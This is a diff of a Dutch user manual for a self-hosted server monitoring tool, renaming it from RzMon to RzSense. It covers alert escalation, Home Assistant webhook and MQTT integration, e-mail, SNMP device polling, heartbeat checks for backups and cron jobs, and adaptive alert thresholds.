 - **Samen met melden na N:** *Melden na … mislukte checks* telt pas vanaf het moment dat de status bevestigd is. Met 3 bij bevestigen en 2 bij melden komt de melding na 4 mislukte controles. Wil je alleen bevestigen, zet melden dan op 1.
 - Een nieuwe check krijgt bij de eerste controle meteen zijn status. Grafieken, de geschiedenis en de popup van de check tonen gewoon elke meting.
-- **Tip:** met *slim interval* (Instellingen → Monitoring → Advies → Voorstellen) controleert RzMon sneller zolang er iets mis is; dan is een status ook sneller bevestigd.
+- **Tip:** met *slim interval* (Instellingen → Monitoring → Advies → Voorstellen) controleert RzSense sneller zolang er iets mis is; dan is een status ook sneller bevestigd.
 
 ### 6.2b Alarmgedrag
 | Instelling | Standaard | Uitleg |
@@ -1128,21 +1130,21 @@ Een check wisselt pas van status na een aantal controles **achter elkaar**. Eén
 | Daggegevens bewaren (dagen) | 730 | Vanaf 1.136.0 (eerder vast ruim een jaar). De dagtotalen voor 📊 Analyse en het Dashboard |
 | Meldingen bewaren (dagen) | 3× de historie (90) | Hoe lang verstuurde meldingen en de statuswijzigingen van checks bewaard worden; de pagina *Meldingen* toont ze per dag. Oudere worden elk uur opgeruimd |
 
-Deze staan bij *Instellingen → Systeem → Database en server → Opslag*. Een meting gaat pas weg als zijn uur samengevat is, dus er gaat nooit iets verloren dat nog niet in de uurgemiddelden staat. Zet je een termijn lager, dan ruimt RzMon meteen op. Onder de velden staat hoe groot de database is en hoeveel er per dag bij komt; groeit hij ongewoon hard (meer dan 30% en 100 MB in een week), dan staat er een oranje punt bij *Status*. In het venster van een check staat ook hoe lang de laatste uitvoering duurde.
+Deze staan bij *Instellingen → Systeem → Database en server → Opslag*. Een meting gaat pas weg als zijn uur samengevat is, dus er gaat nooit iets verloren dat nog niet in de uurgemiddelden staat. Zet je een termijn lager, dan ruimt RzSense meteen op. Onder de velden staat hoe groot de database is en hoeveel er per dag bij komt; groeit hij ongewoon hard (meer dan 30% en 100 MB in een week), dan staat er een oranje punt bij *Status*. In het venster van een check staat ook hoe lang de laatste uitvoering duurde.
 
 ---
 
 #### Over servers heen bundelen 🔗 (vanaf 1.107.0)
-Met **Ook over servers heen bundelen** (*Instellingen → Meldingen → Wanneer melden*, standaard aan) krijg je één bericht als er binnen het bundelvenster meerdere servers misgaan, met de **waarschijnlijke oorzaak** als RzMon die vindt:
+Met **Ook over servers heen bundelen** (*Instellingen → Meldingen → Wanneer melden*, standaard aan) krijg je één bericht als er binnen het bundelvenster meerdere servers misgaan, met de **waarschijnlijke oorzaak** als RzSense die vindt:
 - ze hangen volgens *Afhankelijkheden* achter dezelfde server: *"ze hangen allemaal achter Router: kijk daar eerst"*;
 - ze hangen volgens UniFi aan hetzelfde access point of dezelfde switch (netwerkscan met UniFi aan);
-- alle agents zijn tegelijk stil: dan ligt het eerder aan RzMon zelf of aan zijn netwerk;
+- alle agents zijn tegelijk stil: dan ligt het eerder aan RzSense zelf of aan zijn netwerk;
 - ze zitten in hetzelfde Proxmox-cluster.
 
-De losse checks blijven gewoon zichtbaar in RzMon, en Home Assistant krijgt nog steeds een bericht per check.
+De losse checks blijven gewoon zichtbaar in RzSense, en Home Assistant krijgt nog steeds een bericht per check.
 
 #### Escaleren ⏫ (vanaf 1.108.0)
-Bevestigt niemand een storing, dan kan RzMon hem na een tijd **nog een keer melden, een stap hoger** (*Instellingen → Meldingen → Wanneer melden*, onder het bundelen). Standaard **uit**.
+Bevestigt niemand een storing, dan kan RzSense hem na een tijd **nog een keer melden, een stap hoger** (*Instellingen → Meldingen → Wanneer melden*, onder het bundelen). Standaard **uit**.
 
 | Instelling | Standaard | Uitleg |
 |---|---|---|
@@ -1152,15 +1154,15 @@ Bevestigt niemand een storing, dan kan RzMon hem na een tijd **nog een keer meld
 | Critical wordt | nood | *Hoge prioriteit*, of *nood*: Pushover herhaalt dan tot je bevestigt |
 | Niet escaleren tijdens de stille uren | aan | 's Nachts geen noodmelding; na de stille uren gaat hij alsnog uit als de storing er dan nog is |
 
-Het bericht heet *"⏫ ESCALATIE: CRITICAL – WebServer01 – MariaDB"*, met *"Al 32 min critical en niet bevestigd"*. Eén keer per storing; **bevestigen** (in RzMon, via de link of in de Pushover-app) stopt het. Een check in onderhoud escaleert niet.
+Het bericht heet *"⏫ ESCALATIE: CRITICAL – WebServer01 – MariaDB"*, met *"Al 32 min critical en niet bevestigd"*. Eén keer per storing; **bevestigen** (in RzSense, via de link of in de Pushover-app) stopt het. Een check in onderhoud escaleert niet.
 
 ### 6.3 Home Assistant-webhook
-RzMon kan elke melding ook naar Home Assistant sturen. Daar start je er een automatisering mee: een lamp rood kleuren, een TTS-melding, of een notificatie via de HA-app als extra kanaal naast Pushover.
+RzSense kan elke melding ook naar Home Assistant sturen. Daar start je er een automatisering mee: een lamp rood kleuren, een TTS-melding, of een notificatie via de HA-app als extra kanaal naast Pushover.
 
 **1. Automatisering in Home Assistant.** Ga naar *Instellingen → Automatiseringen → Nieuwe automatisering → ⋮ → Bewerken in YAML* en plak:
 ```yaml
-alias: RzMon meldingen
-description: Meldingen van RzMon via webhook
+alias: RzSense meldingen
+description: Meldingen van RzSense via webhook
 triggers:
   - trigger: webhook
     webhook_id: rzmon-kies-hier-een-lang-geheim-id   # werkt als wachtwoord
@@ -1191,7 +1193,7 @@ mode: queued
 ```
 Vervang `notify.mobile_app_jouw_telefoon` en `light.bureau` door je eigen entiteiten. Het `webhook_id` werkt als wachtwoord: maak het lang en onvoorspelbaar.
 
-**2. In RzMon:** ga naar *Instellingen → Home Assistant-webhook*:
+**2. In RzSense:** ga naar *Instellingen → Home Assistant-webhook*:
 - zet *Webhook aan*;
 - vul als URL in: `http://<home-assistant>:8123/api/webhook/rzmon-kies-hier-een-lang-geheim-id`;
 - klik op **🏠 Testbericht naar Home Assistant**;
@@ -1220,7 +1222,7 @@ Vervang `notify.mobile_app_jouw_telefoon` en `light.bureau` door je eigen entite
 }
 ```
 
-> `local_only: true` betekent dat HA de webhook alleen accepteert vanaf je eigen netwerk. Draait RzMon ergens anders, bijvoorbeeld in de cloud, zet dit dan op `false` en gebruik een HTTPS-URL.
+> `local_only: true` betekent dat HA de webhook alleen accepteert vanaf je eigen netwerk. Draait RzSense ergens anders, bijvoorbeeld in de cloud, zet dit dan op `false` en gebruik een HTTPS-URL.
 
 ### 6.4 E-mail
 Ga naar *Instellingen → E-mail*, zet **E-mailmeldingen aan** en vul in:
@@ -1237,18 +1239,18 @@ Klik op **📧 Testmail sturen**. Dat gebruikt wat je hebt ingevuld, ook als het
 
 Aandachtspunten:
 - **App-wachtwoord:** Gmail, Outlook/Hotmail en iCloud accepteren je gewone wachtwoord niet. Maak in je accountinstellingen een *app-wachtwoord* aan (daarvoor moet 2FA bij die dienst aan staan).
-- **Inhoud:** de mail bevat de melding, de tijd, de **bevestig-link** en een link naar RzMon (als de *Basis-URL* in Setup is ingevuld).
+- **Inhoud:** de mail bevat de melding, de tijd, de **bevestig-link** en een link naar RzSense (als de *Basis-URL* in Setup is ingevuld).
 - **Foutmelding bij de test:** die zegt wat er mis is, bijvoorbeeld "gebruikersnaam/wachtwoord onjuist" of "klopt de beveiliging? 465 = SSL/TLS, 587 = STARTTLS".
 
 ### 6.5 MQTT voor Home Assistant
-Met MQTT verschijnt RzMon vanzelf in Home Assistant, zonder YAML.
+Met MQTT verschijnt RzSense vanzelf in Home Assistant, zonder YAML.
 
 **1. MQTT in Home Assistant.** Heb je nog geen MQTT:
 - installeer de add-on **Mosquitto broker** (*Instellingen → Add-ons → Add-on winkel*) en start hem;
 - voeg de integratie **MQTT** toe (*Instellingen → Apparaten en diensten*); meestal stelt HA die zelf voor;
-- maak een gebruiker voor RzMon, bijvoorbeeld een HA-gebruiker `rzmon` (*Instellingen → Personen → Gebruikers*). Mosquitto accepteert HA-gebruikers als MQTT-login.
+- maak een gebruiker voor RzSense, bijvoorbeeld een HA-gebruiker `rzmon` (*Instellingen → Personen → Gebruikers*). Mosquitto accepteert HA-gebruikers als MQTT-login.
 
-**2. In RzMon:** ga naar *Instellingen → MQTT*:
+**2. In RzSense:** ga naar *Instellingen → MQTT*:
 - zet **MQTT aan**;
 - vul de MQTT-server in (het adres van Home Assistant), poort `1883`, en de gebruikersnaam en het wachtwoord;
 - klik op **📡 Verbinding testen & publiceren** . De instellingen worden meteen opgeslagen.
@@ -1257,14 +1259,14 @@ Onder *Apparaten en diensten → MQTT* staan nu:
 
 | Apparaat | Entiteiten |
 |---|---|
-| **RzMon** | *Algehele status* (Alles in orde, Aandacht nodig of Storing, met alle details als attributen), *Gezondheid* (score in %), *Probleem* (aan als er ergens een warning of critical is), *Kritiek* en *Waarschuwingen* (aantallen), *Laatste controle* |
+| **RzSense** | *Algehele status* (Alles in orde, Aandacht nodig of Storing, met alle details als attributen), *Gezondheid* (score in %), *Probleem* (aan als er ergens een warning of critical is), *Kritiek* en *Waarschuwingen* (aantallen), *Laatste controle* |
 | **Elke server** | *Probleem* en *Status* (OK, WARNING, CRITICAL, UNKNOWN of ONDERHOUD) |
 | **Elke check** | Een status-sensor, en bij checks met een meetwaarde ook een sensor met die waarde (ms, %, dagen). Die kun je in grafieken en automatiseringen gebruiken |
 
 Goed om te weten:
-- **Bijwerken:** RzMon publiceert elke minuut, bij elke cron-run.
-- **Niet beschikbaar:** komt er 10 minuten niets binnen, bijvoorbeeld omdat cron of RzMon gestopt is, dan worden de sensoren *niet beschikbaar*. Daar kun je in HA een melding op maken: zo merk je het ook als RzMon zelf uitvalt.
-- **Verwijderen:** verwijder je een check of server in RzMon, dan verdwijnt hij ook uit HA.
+- **Bijwerken:** RzSense publiceert elke minuut, bij elke cron-run.
+- **Niet beschikbaar:** komt er 10 minuten niets binnen, bijvoorbeeld omdat cron of RzSense gestopt is, dan worden de sensoren *niet beschikbaar*. Daar kun je in HA een melding op maken: zo merk je het ook als RzSense zelf uitvalt.
+- **Verwijderen:** verwijder je een check of server in RzSense, dan verdwijnt hij ook uit HA.
 - **TLS:** kies *Versleuteling: TLS* en poort `8883`. Gebruik je een self-signed certificaat, zet dan onder *Geavanceerd* de certificaatcontrole uit.
 - **Prefix:** *Geavanceerd* bevat ook de discovery-prefix (standaard `homeassistant`) en het basis-topic (standaard `rzmon`). Die hoef je normaal niet te veranderen.
 
@@ -1277,9 +1279,9 @@ triggers:
 actions:
   - action: notify.mobile_app_jouw_telefoon
     data:
-      message: "RzMon: {{ state_attr('binary_sensor.rzmon_probleem', 'critical') }} kritieke storing(en)"
+      message: "RzSense: {{ state_attr('binary_sensor.rzmon_probleem', 'critical') }} kritieke storing(en)"
 ```
-De precieze entiteitnamen zie je in HA bij het apparaat *RzMon*.
+De precieze entiteitnamen zie je in HA bij het apparaat *RzSense*.
 
 ---
 
@@ -1353,7 +1355,7 @@ Goed om te weten:
 **Grafieken en beschikbaarheid**
 - Onder elke check staat een **minigrafiek** van de laatste 24 uur: de lijn is de meetwaarde, en de gekleurde streepjes eronder tonen de status. Klik erop (of op 📈) voor de grote grafiek, met minimum, gemiddelde en maximum.
 - Een opengeklapte server toont **Bereikbaar: 24 u · 7 d · 30 d**. Dat is het percentage metingen waarin de ping lukte; heeft de server geen ping-check, dan tellen de TCP- en HTTP-checks. Ingeklapt staat het percentage van 7 dagen achter ⏱.
-- **Diskvoorspelling:** RzMon trekt een lijn door de diskmetingen van de afgelopen 7 dagen. Groeit een disk, dan staat in de check bijvoorbeeld *vol over ~12 dagen (+0,8%/dag)*. Raakt hij binnen 7 dagen vol, dan wordt de check WARNING, ook als de drempel nog niet bereikt is. Het aantal dagen stel je in onder *Instellingen → Alarmgedrag* (0 = uit). Er is minimaal een dag aan metingen nodig.
+- **Diskvoorspelling:** RzSense trekt een lijn door de diskmetingen van de afgelopen 7 dagen. Groeit een disk, dan staat in de check bijvoorbeeld *vol over ~12 dagen (+0,8%/dag)*. Raakt hij binnen 7 dagen vol, dan wordt de check WARNING, ook als de drempel nog niet bereikt is. Het aantal dagen stel je in onder *Instellingen → Alarmgedrag* (0 = uit). Er is minimaal een dag aan metingen nodig.
 
 ### 7.3 Poortscan
 Klik op een serverkaart op **🔍**:
@@ -1378,7 +1380,7 @@ Kies een duur (15 min, 30 min, 1 uur … 1 week), of een vast eindtijdstip, en v
 - **Herkenbaar:** servers en checks in onderhoud zijn paars gestreept, met een label *🔧 tot 14:30*. Bij globaal onderhoud staat bovenaan een balk.
 - **Na afloop** stopt het onderhoud vanzelf. Is er dan nog iets mis, dan komt de melding bij de volgende check, en is het weer goed, dan krijg je een herstelmelding. Zo mis je nooit iets dat na je onderhoud kapot is gebleven.
 - **Eerder stoppen:** klik op 🔧 → **Onderhoud beëindigen**, of op **Beëindigen** in de balk.
-- **REST API:** checks in onderhoud tellen niet mee voor de totaalstatus. De sensor *RzMon alles OK* springt dus niet op rood door gepland onderhoud. `counts.maintenance` telt ze apart.
+- **REST API:** checks in onderhoud tellen niet mee voor de totaalstatus. De sensor *RzSense alles OK* springt dus niet op rood door gepland onderhoud. `counts.maintenance` telt ze apart.
 
 #### Automatisch onderhoud na herhaalde meldingen
 Blijft een check fout, dan krijg je eerst gewoon meldingen: de eerste, en daarna herhalingen volgens *Herhalen* in 🔔 Meldingen. Bij de **3e verstuurde melding** voor dezelfde storing gaat **die ene check** automatisch in onderhoud:
@@ -1401,7 +1403,7 @@ Weet je van een storing en ben je ermee bezig? Bevestig hem, dan word je er niet
 | **Dashboard, één check** | De groene **✔** bij de check |
 | **Dashboard, hele server** | De groene **✔** op de serverkaart: alle onbevestigde storingen van die server |
 | **Telefoon** | Tik in de Pushover-melding op **✔ Bevestigen** → *Bevestigen* |
-| **Pushover-app** (alleen Emergency, prioriteit 2) | Tik op *Acknowledge*; RzMon neemt dat binnen een minuut over |
+| **Pushover-app** (alleen Emergency, prioriteit 2) | Tik op *Acknowledge*; RzSense neemt dat binnen een minuut over |
 
 **Wat er gebeurt:**
 - **Geen meldingen meer** voor deze storing: geen herhalingen, en ook niet als hij van WARNING naar CRITICAL gaat.
@@ -1438,21 +1440,21 @@ Je kunt meerdere lagen maken, bijvoorbeeld *Internet → Router → Switch → N
 Bovenliggende servers worden in elke ronde als eerste gecontroleerd, zodat de onderdrukking meteen klopt.
 
 ### 7.7 SNMP 📡
-Op apparaten waar geen agent op kan, zoals switches, access points, een NAS, een UPS of een printer, leest RzMon de gegevens zelf uit via SNMP. Het kan ook op servers met een agent, bijvoorbeeld Proxmox of een syslog-server met `snmpd`.
+Op apparaten waar geen agent op kan, zoals switches, access points, een NAS, een UPS of een printer, leest RzSense de gegevens zelf uit via SNMP. Het kan ook op servers met een agent, bijvoorbeeld Proxmox of een syslog-server met `snmpd`.
 
 **Op het apparaat**
-- Zet SNMP aan (alleen lezen) en geef het IP-adres van RzMon toegang. RzMon vraagt op UDP-poort 161.
+- Zet SNMP aan (alleen lezen) en geef het IP-adres van RzSense toegang. RzSense vraagt op UDP-poort 161.
 - Kies **v2c** met een eigen community (liever niet `public`), of beter **v3** met een gebruiker, *SHA* en *AES*.
-- Waar het zit verschilt per merk en versie: bij UniFi in de Network-app (instellingen, SNMP), bij TP-Link Omada of JetStream onder de systeeminstellingen (SNMP), bij Synology: *Configuratiescherm → Terminal & SNMP → SNMP*; Proxmox/Debian: `apt install snmpd` en in `/etc/snmp/snmpd.conf` bijvoorbeeld `rocommunity <community> <IP van RzMon>` en `agentAddress udp:161`.
+- Waar het zit verschilt per merk en versie: bij UniFi in de Network-app (instellingen, SNMP), bij TP-Link Omada of JetStream onder de systeeminstellingen (SNMP), bij Synology: *Configuratiescherm → Terminal & SNMP → SNMP*; Proxmox/Debian: `apt install snmpd` en in `/etc/snmp/snmpd.conf` bijvoorbeeld `rocommunity <community> <IP van RzSense>` en `agentAddress udp:161`.
 
 **Algemene instelling** (vanaf 1.178.0): in *Instellingen → Koppelingen → SNMP* vul je één keer de versie, poort en community of v3-gebruiker in. Elk apparaat met SNMP aan en zonder *Eigen instellingen* gebruikt die. Je ziet er welke apparaten de algemene en welke een eigen instelling hebben; **🔍 Alles testen** vraagt ze allemaal tegelijk om hun systeeminformatie. Uitzetten kan pas als geen apparaat de algemene instelling meer gebruikt.
 
-**In RzMon**
+**In RzSense**
 1. ✎ Bewerk de server (of ＋ Server), of open de **Agent Manager**, en zet bij **📡 SNMP** de schakelaar aan. Zonder **Eigen instellingen** gebruikt het apparaat de algemene instelling; met *Eigen instellingen* kies je de versie en vul je de community of de v3-gebruiker met wachtwoorden in.
 2. Klik op **🔍 Test SNMP**. Je ziet de naam, de fabrikant en hoe lang het apparaat aan staat, of een duidelijke fout (geen antwoord, verkeerde community…).
-3. Sla op. RzMon doorzoekt het apparaat meteen en toont **📡 SNMP-checks**: vink aan wat je wilt bewaken en klik op **Toevoegen**. Later open je die lijst met de knop **📡 SNMP-checks** bij de server; wat al bewaakt wordt, staat er grijs bij.
+3. Sla op. RzSense doorzoekt het apparaat meteen en toont **📡 SNMP-checks**: vink aan wat je wilt bewaken en klik op **Toevoegen**. Later open je die lijst met de knop **📡 SNMP-checks** bij de server; wat al bewaakt wordt, staat er grijs bij.
 
-**Wat RzMon herkent**
+**Wat RzSense herkent**
 | Groep | Checks | Standaard |
 |---|---|---|
 | Systeem | Uptime (herstart), CPU, geheugen, load, temperatuur | herstart < 1 uur = WARNING · CPU/geheugen 85/95 % |
@@ -1480,30 +1482,30 @@ Op apparaten waar geen agent op kan, zoals switches, access points, een NAS, een
   | **Kwaliteit ‹SSID›** | Aandeel herhaald verzonden pakketten, met de CCQ | 15/30 % · niet aangevinkt |
 
   Verkeer en kwaliteit zijn het verschil tussen twee metingen; na het toevoegen staat er eerst *volgt na de volgende meting*. De firmwaremelding volgt de regel *Info* van de meldregels. Een eerder toegevoegde check *UniFi clients* blijft werken (het totaal).
-- De onderdelen voor TP-Link, UniFi, MikroTik, APC en printers zijn gemaakt met de MIB's van de fabrikant, maar nog niet op elk merk echt getest. RzMon biedt alleen aan wat het apparaat echt beantwoordt; klopt er iets niet, laat het weten.
+- De onderdelen voor TP-Link, UniFi, MikroTik, APC en printers zijn gemaakt met de MIB's van de fabrikant, maar nog niet op elk merk echt getest. RzSense biedt alleen aan wat het apparaat echt beantwoordt; klopt er iets niet, laat het weten.
 
 **Eigen OID**
 Wil je iets anders uitlezen, gebruik dan **＋ Eigen OID** in de lijst, of ＋ Check → *SNMP* → *Eigen OID*:
 - **Getal**, met drempels. *Vermenigvuldigen met* rekent om, bijvoorbeeld `0.1` als het apparaat tienden van graden geeft. Zet *Lager is slechter* aan voor iets als een batterijpercentage.
-- **Teller**: RzMon maakt er een waarde per seconde van, bijvoorbeeld octets × 8 = bit/s.
+- **Teller**: RzSense maakt er een waarde per seconde van, bijvoorbeeld octets × 8 = bit/s.
 - **Tekst vergelijken**: *is precies*, *bevat*, *bevat niet* of *past op regex*, met warning of critical als het niet klopt.
 - Geef de OID **numeriek**, bijvoorbeeld `1.3.6.1.4.1.14988.1.1.3.10.0`. Opzoeken kan met `snmpwalk -v2c -c <community> <apparaat> 1.3.6.1.4.1` (pakket `net-snmp-utils`, dat `install-rocky.sh` meeinstalleert).
 
 **Goed om te weten**
 - Geeft het apparaat geen antwoord, dan worden de SNMP-checks **onbekend**. Of het apparaat bereikbaar is, blijft de ping bepalen; voeg dus ook een ping-check toe.
 - Antwoordt een apparaat niet, dan wachten de andere SNMP-checks van die server in dezelfde ronde niet ook (hooguit 3 seconden per apparaat).
-- De community en wachtwoorden staan in de database van RzMon en gaan nooit terug naar de browser; in het formulier zie je `••••••••`.
-- RzMon heeft hiervoor de PHP-extensie **php-snmp** nodig. `install-rocky.sh` installeert die; bij een oudere installatie: `sudo dnf -y install php-snmp net-snmp-utils && sudo systemctl restart php-fpm`. Ontbreekt hij, dan zegt de check of de testknop dat.
-- Traps (meldingen die het apparaat zelf stuurt) worden niet ontvangen; RzMon vraagt de waarden zelf op, standaard elke minuut.
+- De community en wachtwoorden staan in de database van RzSense en gaan nooit terug naar de browser; in het formulier zie je `••••••••`.
+- RzSense heeft hiervoor de PHP-extensie **php-snmp** nodig. `install-rocky.sh` installeert die; bij een oudere installatie: `sudo dnf -y install php-snmp net-snmp-utils && sudo systemctl restart php-fpm`. Ontbreekt hij, dan zegt de check of de testknop dat.
+- Traps (meldingen die het apparaat zelf stuurt) worden niet ontvangen; RzSense vraagt de waarden zelf op, standaard elke minuut.
 
 ### 7.8 Heartbeat: scripts, back-ups en cronjobs 📥
-Bij een **heartbeat-check** (ook wel *passieve check*) vraagt RzMon zelf niets op: het script of apparaat meldt zich bij RzMon als het klaar is. Blijft die melding uit, dan krijg je bericht. Ideaal voor back-ups, cronjobs, certificaatvernieuwing en alles wat 's nachts stil hoort te lukken.
+Bij een **heartbeat-check** (ook wel *passieve check*) vraagt RzSense zelf niets op: het script of apparaat meldt zich bij RzSense als het klaar is. Blijft die melding uit, dan krijg je bericht. Ideaal voor back-ups, cronjobs, certificaatvernieuwing en alles wat 's nachts stil hoort te lukken.
 
 **Aanmaken:** klap de server open → **＋ Check** → type **Heartbeat**.
 - **Naam (voor rzmon-hb)**: bv. `backup-db` (letters, cijfers, punt, `-` of `_`; per server uniek).
 - **Verwacht**: *elke … minuten/uren/dagen*, *elke dag om …*, *elke week op …* of een eigen **cron-schema** (`minuut uur dag maand weekdag`, bv. `30 2 * * 1-5` = werkdagen om 02:30). Gebruik hetzelfde schema als je cronjob.
 - **Speling** (standaard 60 minuten): zo lang mag de melding op zich laten wachten. Daarna **WARNING**, na twee keer de speling **CRITICAL**.
-- **Maximale duur**: stuurt het script ook *start*, dan meet RzMon hoe lang het duurt. Duurt het langer dan dit maximum, dan wordt de check CRITICAL (*hangt het?*). Leeg = vanzelf: twee keer het gemiddelde van de laatste keren (minstens 5 minuten, vanaf 3 metingen).
+- **Maximale duur**: stuurt het script ook *start*, dan meet RzSense hoe lang het duurt. Duurt het langer dan dit maximum, dan wordt de check CRITICAL (*hangt het?*). Leeg = vanzelf: twee keer het gemiddelde van de laatste keren (minstens 5 minuten, vanaf 3 metingen).
 - **Eenheid**: stuur je een waarde mee (bv. de grootte van de back-up), vul dan de eenheid in (`GB`, `bestanden` …); dan gelden de drempels. Zonder eenheid is de waarde de duur in minuten (voor de grafiek).
 
 **Wat betekent wat?**
@@ -1517,14 +1519,14 @@ Bij een **heartbeat-check** (ook wel *passieve check*) vraagt RzMon zelf niets o
 
 **Melden: twee manieren**
 
-1. **Op een server met de agent (1.52.0 of nieuwer): `rzmon-hb`**. De melding gaat versleuteld mee met het volgende rapport van de agent (binnen een minuut) en blijft bewaard als RzMon even onbereikbaar is. Elke gebruiker op de server mag het commando gebruiken.
+1. **Op een server met de agent (1.52.0 of nieuwer): `rzmon-hb`**. De melding gaat versleuteld mee met het volgende rapport van de agent (binnen een minuut) en blijft bewaard als RzSense even onbereikbaar is. Elke gebruiker op de server mag het commando gebruiken.
    ```bash
    rzmon-hb backup-db start                 # begonnen
    rzmon-hb backup-db ok                    # gelukt
    rzmon-hb backup-db ok "12 tabellen" --value 3.4
    rzmon-hb backup-db fail "schijf vol"     # mislukt, met reden
    ```
-   Bekende naam niet gevonden? Dan staat er in het logboek van de agent *RzMon heeft geen heartbeat-check met de naam …*.
+   Bekende naam niet gevonden? Dan staat er in het logboek van de agent *RzSense heeft geen heartbeat-check met de naam …*.
 2. **Overal elders: de geheime URL**. Na het opslaan staat die in het checkformulier, met kopieerknoppen:
    ```bash
    curl -fsS -m 10 http://RZMON-ADRES/hb.php/<code>                       # ok
@@ -1593,7 +1595,7 @@ case "$1" in
 esac
 exit 0
 ```
-Zet in `/etc/vzdump.conf` de regel `script: /usr/local/bin/vzdump-rzmon.sh`. Kies in RzMon hetzelfde schema als de back-uptaak in Proxmox (*Datacenter → Backup*).
+Zet in `/etc/vzdump.conf` de regel `script: /usr/local/bin/vzdump-rzmon.sh`. Kies in RzSense hetzelfde schema als de back-uptaak in Proxmox (*Datacenter → Backup*).
 
 *certbot* (systemd-timer, check: *elke 1 dagen*, speling 720 minuten):
 ```bash
@@ -1628,7 +1630,7 @@ rest_command:
 ```
 En een automatisering die de automatische back-up van Home Assistant (2025.5 of nieuwer) doorgeeft:
 ```yaml
-alias: RzMon – back-up Home Assistant
+alias: RzSense – back-up Home Assistant
 triggers:
   - trigger: state
     entity_id: event.backup_automatic_backup
@@ -1671,11 +1673,11 @@ AGENT_DIR=/mnt/<pool>/rzmon-agent bash /mnt/<pool>/rzmon-agent/rzmon-agent.sh --
 
 ### 7.10 Nog niet bewaakt 💡 en Nu proberen 🧪
 
-**💡 Nog niet bewaakt** (vanaf 1.95.0): op een agent-server ziet RzMon wat de agent meldt maar nog geen check heeft. Het gaat om disks, services die draaien en automatisch starten, containers, certificaten en poorten die van buiten de server bereikbaar zijn. Systeemservices zoals `systemd-*`, `getty`, `dbus` en `cron` tellen niet mee.
+**💡 Nog niet bewaakt** (vanaf 1.95.0): op een agent-server ziet RzSense wat de agent meldt maar nog geen check heeft. Het gaat om disks, services die draaien en automatisch starten, containers, certificaten en poorten die van buiten de server bereikbaar zijn. Systeemservices zoals `systemd-*`, `getty`, `dbus` en `cron` tellen niet mee.
 - Bij de server staat dan **💡 3 nieuw gevonden**. Klik erop, vink aan wat je wilt bewaken en kies **Checks toevoegen** (met gangbare drempels; poorten staan standaard uit).
 - **🙈 Gekozen negeren**: dan komt het voor die server niet meer terug. *Weer tonen* zet alles terug.
 
-**🧪 Nu proberen** (vanaf 1.95.0): in het checkformulier zie je meteen wat de check nu zou zeggen (status, waarde en bericht), voordat je opslaat. Er wordt niets bewaard of gemeld. Op een agent-server gebruikt RzMon het laatste rapport; een nieuwe service, log of commando ziet de agent pas bij zijn volgende rapport.
+**🧪 Nu proberen** (vanaf 1.95.0): in het checkformulier zie je meteen wat de check nu zou zeggen (status, waarde en bericht), voordat je opslaat. Er wordt niets bewaard of gemeld. Op een agent-server gebruikt RzSense het laatste rapport; een nieuwe service, log of commando ziet de agent pas bij zijn volgende rapport.
 
 ### 7.11 Opschoonadvies 🧹
 
@@ -1696,26 +1698,26 @@ Klik op een naam om de check te bewerken. Met 🙈 (*dit is normaal*) komt het p
 - **Wachtwoorden, tokens en sleutels** staan er nooit leesbaar in (••••••••) en worden niet teruggezet.
 - **Bewaren:** 30 dagen, 90 dagen (standaard), 1 jaar of 3 jaar.
 
-**📦 Exporteren en importeren** (vanaf 1.97.0, *Instellingen → 🛠️ Systeem*): servers, checks en sjablonen, en eventueel de instellingen, als één JSON-bestand. Handig om naar een tweede RzMon te kopiëren, of als leesbare reserve naast de back-up.
-- **Zonder geheimen:** wachtwoorden, tokens, sleutels en de SNMP-community gaan niet mee. Agents koppel je op de nieuwe RzMon opnieuw.
+**📦 Exporteren en importeren** (vanaf 1.97.0, *Instellingen → 🛠️ Systeem*): servers, checks en sjablonen, en eventueel de instellingen, als één JSON-bestand. Handig om naar een tweede RzSense te kopiëren, of als leesbare reserve naast de back-up.
+- **Zonder geheimen:** wachtwoorden, tokens, sleutels en de SNMP-community gaan niet mee. Agents koppel je op de nieuwe RzSense opnieuw.
 - **Importeren voegt alleen toe.** Een server of sjabloon met dezelfde naam blijft zoals hij is, en een check die er al is (zelfde type, doel en soort) wordt overgeslagen. Je ziet eerst wat er gebeurt; importeren vraagt je wachtwoord.
 
 **🧪 Meldketen testen** (vanaf 1.97.0, *Instellingen → 🔔 Meldingen → Kanalen*): één testmelding door alle kanalen die aan staan (Pushover, e-mail, Home Assistant-webhook, MQTT en de meldingenpagina), met de opgeslagen instellingen, met per kanaal ✓ of ✕ en de fout.
 
 ### 7.13 Slimme drempels 🧠 (vanaf 1.107.0)
-Vaste drempels passen niet altijd: een CPU die elke nacht om 3:00 op 100% staat door de back-up, geeft elke nacht een warning, en een website die normaal in 120 ms antwoordt maar nu in 900 ms, merk je met een drempel van 1000 ms niet. Daarom kan RzMon per check **leren wat normaal is**, per uur van de week (maandag 3:00 is anders dan dinsdag 14:00), en daar de drempels op zetten.
+Vaste drempels passen niet altijd: een CPU die elke nacht om 3:00 op 100% staat door de back-up, geeft elke nacht een warning, en een website die normaal in 120 ms antwoordt maar nu in 900 ms, merk je met een drempel van 1000 ms niet. Daarom kan RzSense per check **leren wat normaal is**, per uur van de week (maandag 3:00 is anders dan dinsdag 14:00), en daar de drempels op zetten.
 
 **Per check kies je** (✎ → *Drempels*):
 
 | Modus | Wat het doet |
 |---|---|
 | ✋ **Handmatig** | De vaste drempels, zoals altijd. |
-| 🧠 **Slim** | RzMon leert wat normaal is en zet de drempels zelf. |
+| 🧠 **Slim** | RzSense leert wat normaal is en zet de drempels zelf. |
 | 🧠🛡️ **Slim met vangnet** | Slim, maar vanaf het vangnet (*Altijd critical vanaf*, bv. RAM 98%) altijd CRITICAL. |
 
 - **Werkt bij** ping, TCP, HTTP, CPU, RAM, SNMP (CPU, geheugen, interface, load, temperatuur, UPS-belasting en -temperatuur, Synology-temperaturen, UniFi-kanaalbezetting en -kwaliteit) en vanaf 1.156.0 ook **containers** (een check op alleen CPU of alleen RAM; de gecombineerde containercheck niet), **DNS** (antwoordtijd), **NTP** (afwijking van de klok) en **MySQL/MariaDB** (verbindingstijd). **Disks** houden vaste drempels met de voorspelling: een disk heeft geen "normaal per uur", en leren zou een vollopende disk gewoon volgen.
 - **Leren**: uit de meetwaarden van de laatste 28 dagen (de bewaartermijn van meetwaarden telt mee), robuust (mediaan en percentielen, zodat één uitschieter niets verpest). Tot er **7 dagen** gegevens zijn, gelden de vaste drempels (*🧠 leert nog 3/7 dagen*).
